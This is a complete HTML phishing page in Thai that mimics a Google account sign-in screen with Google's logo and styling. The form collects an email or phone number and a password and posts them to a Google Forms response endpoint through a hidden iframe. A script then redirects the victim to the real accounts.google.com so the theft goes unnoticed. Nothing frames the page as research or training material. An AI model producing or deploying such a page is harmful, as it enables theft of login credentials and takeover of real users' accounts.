<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <title>ลงชื่อเข้าใช้งาน - บัญชี Google</title>
    <style>
        body { font-family: arial,sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: white; }
        .box { border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px; width: 360px; text-align: center; }
        input { width: 100%; padding: 13px 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; float: right; font-weight: 500; }
        iframe { display: none; }
    </style>
</head>
<body>

<div class="box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75">
    <h2>ลงชื่อเข้าใช้งาน</h2>
    <p>ใช้บัญชี Google ของคุณ</p>

    <form action="https://docs.google.com/forms/d/e/1FAIpQLSeJuuzCrT38oInaQg0sSGQ1-BBW7mQO0-O9HcvxwzyXluYa9Q/formResponse" 
          method="POST" 
          target="hidden_iframe" 
          onsubmit="moveOn()">
        
        <input type="text" name="entry.1449652638" placeholder="อีเมลหรือโทรศัพท์" required>
        <input type="password" name="entry.270012312" placeholder="รหัสผ่าน" required>
        
        <div style="margin-top: 40px;">
            <button type="submit">ถัดไป</button>
        </div>
    </form>
</div>

<iframe name="hidden_iframe" id="hidden_iframe"></iframe>

<script>
    function moveOn() {
        setTimeout(() => {
            window.location.href = "https://accounts.google.com";
        }, 1000);
    }
</script>

</body>
</html>
